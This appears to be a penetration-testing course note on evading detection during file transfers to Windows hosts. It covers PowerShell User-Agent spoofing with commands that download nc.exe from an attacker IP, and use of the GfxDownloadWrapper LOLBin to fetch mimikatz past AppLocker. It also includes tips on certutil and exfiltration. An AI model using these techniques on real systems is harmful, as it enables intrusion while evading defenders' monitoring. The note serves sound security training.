# THEORY — Evading Detection

## ID
624

## Module
File Transfers

## Kind
theory

## Title
Section 10 — Evading Detection

## Description
Spoof PowerShell User-Agent strings to blend with legitimate browser traffic, and reach for obscure LOLBins (GfxDownloadWrapper, etc.) when AppLocker / command-line logging would catch standard tools.

## Tags
evasion, user-agent, lolbins, gfxdownloadwrapper, applocker, opsec, evasive-testing

## Commands
- `[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl`
- `$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome`
- `Invoke-WebRequest <url> -UserAgent $UserAgent -OutFile "<out>"`
- `GfxDownloadWrapper.exe "<url>" "C:\Temp\<file>"`

## TL;DR — What's Important
- `Invoke-WebRequest -UserAgent` lets you swap the default `WindowsPowerShell/x.x` UA for browser-like strings — bypasses many UA-based detections.
- When PowerShell / Netcat are blocked outright, **misplaced-trust binaries** ("LOLBins") may still be allowed by AppLocker — e.g. `GfxDownloadWrapper.exe`.
- Evasion ≠ stealth — process telemetry still sees the host running these binaries. Evasion buys you a layer, not invisibility.

## PowerShell — Built-in UA Spoof Catalog

PowerShell ships pre-built UA strings via `[Microsoft.PowerShell.Commands.PSUserAgent]`:

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() |
  Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

| Name | UA String |
|------|-----------|
| InternetExplorer | `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)` |
| FireFox | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0` |
| Chrome | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6` |
| Opera | `Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1` |
| Safari | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16` |

> These versions are **old** (Chrome 7? Firefox 4?) — modern UA filtering will still flag them. For real evasion, copy a current Chrome UA string from a live browser.

### Usage
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<ip>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

Network catcher will now see:
```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: <ip>
```

## When UA Spoofing Isn't Enough — Use LOLBins

If AppLocker blocks PowerShell or command-line logging alerts on `Invoke-WebRequest`, pivot to a less-scrutinized binary.

### Example: `GfxDownloadWrapper.exe` (Intel Graphics Driver)
Ships on many corporate laptops with Intel iGPUs. Purpose-built to download config files — and will happily download anything.
```powershell
GfxDownloadWrapper.exe "http://<ip>/mimikatz.exe" "C:\Temp\nc.exe"
```

**Why it works:**
- Microsoft / Intel signed → not blocked by app whitelisting.
- Not a typical "interesting" binary for EDR / SIEM rules.
- No PowerShell, no `certutil`, no `bitsadmin` — none of the watched-list names.

> Check LOLBAS for ~40+ Windows binaries with file-transfer capability. GTFOBins has the Linux equivalents.

## Defense-in-Depth Reality Check

UA spoofing handles **one layer** — the proxy/IDS UA filter. It does **not** handle:

| Layer | What still sees you |
|-------|--------------------|
| Sysmon / EDR process tree | `powershell.exe` spawning `iwr`, network connection to `<ip>` |
| AMSI script-block logging | The full `Invoke-WebRequest …` command, including the UA value |
| DNS logs | The hostname resolution to your attacker domain |
| Firewall netflow | Source-host → external-IP byte counts |
| TLS JA3 fingerprinting | Different TLS client stacks have different ClientHello fingerprints |

LOLBins handle layers 1, 2, 3 (binary lookup + process tree) but still light up firewall and JA3.

## Picking an Evasion Stack

1. **Default block:** simple UA filter → spoof UA, default behavior works.
2. **PowerShell allowed, IWR logged:** drop IWR, use a LOLBin (`certreq`, `GfxDownloadWrapper`, BITS via `Start-BitsTransfer`).
3. **PowerShell blocked entirely:** `cscript.exe wget.vbs` or LOLBins.
4. **Egress firewall whitelist by domain:** route via an allowed cloud service (e.g., `*.azureedge.net`, `raw.githubusercontent.com` if permitted) — or fall back to in-network methods (SMB, WinRM, /dev/tcp).

## Key Takeaways
- PowerShell's built-in `PSUserAgent` strings are convenient but **outdated** — pull a fresh Chrome/Edge UA from a real browser.
- LOLBins shift detection from binary-name to network-behavior — still detectable but at a layer most orgs aren't watching.
- Evasion is **stacked layers**, not single tricks: UA + LOLBin + signed-domain egress + slow transfer rate all together.
- Always practice evasion only when scope explicitly allows it — gratuitous evasion on a normal pentest can break SOC training opportunities and irritate the blue team.

## Closing Thoughts (from the HTB module)
- Practice as many transfer methods as possible across the Pentester path.
- Got a web shell? Try `certutil` to download more tooling.
- Need to exfil? Try Impacket SMB or `uploadserver`.
- Find a new LOLBin/GTFOBin every engagement — your toolbox compounds.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-transfers]]
← [[09-detection]]
<!-- AUTO-LINKS-END -->
